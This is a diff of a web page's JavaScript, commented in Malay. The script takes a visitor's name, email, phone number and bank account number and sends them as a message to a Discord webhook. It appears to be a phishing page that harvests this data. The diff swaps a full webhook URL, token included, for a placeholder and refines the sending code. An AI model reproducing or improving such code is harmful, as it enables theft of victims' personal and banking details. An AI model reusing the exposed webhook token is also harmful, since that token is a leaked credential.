@@ -136,14 +136,11 @@
         // Tunjukkan hasil
         document.getElementById("result").style.display = "block";
 
-        // Hantar data ke webhook
-        const webhookUrl = "https://discord.com/api/webhooks/1354966055096942761/uX7rGBVBXSUV3BX5mhQPIkqgufge-XSXxUOiVUi9Yy7KKe3WnXsxgnQ79LfaB9GnZe1x/github"; // Gantikan dengan URL webhook anda
+        // Hantar data ke webhook Discord
+        const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"; // Gantikan dengan URL webhook anda
 
         const payload = {
-            name: name,
-            email: email,
-            phone: phone,
-            bank: bank
+            content: `Nama: ${name}\nEmel: ${email}\nNombor Telefon: ${phone}\nAkaun Bank: ${bank}`
         };
 
         // Hantar POST request menggunakan fetch
@@ -152,12 +149,16 @@
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(payload) // Pastikan data dihantar dalam format JSON
         })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Maklumat berjaya dihantar:", data);
-            alert("Maklumat berjaya dihantar!");
+        .then(response => {
+            if (response.ok) {
+                console.log("Maklumat berjaya dihantar!");
+                alert("Maklumat berjaya dihantar!");
+            } else {
+                console.error("Gagal menghantar maklumat:", response.statusText);
+                alert("Gagal menghantar maklumat.");
+            }
         })
         .catch(error => {
             console.error("Terdapat ralat semasa menghantar maklumat:", error);
@@ -167,5 +168,4 @@
 </script>
 
 </body>
-    </html>
-    
+</html>
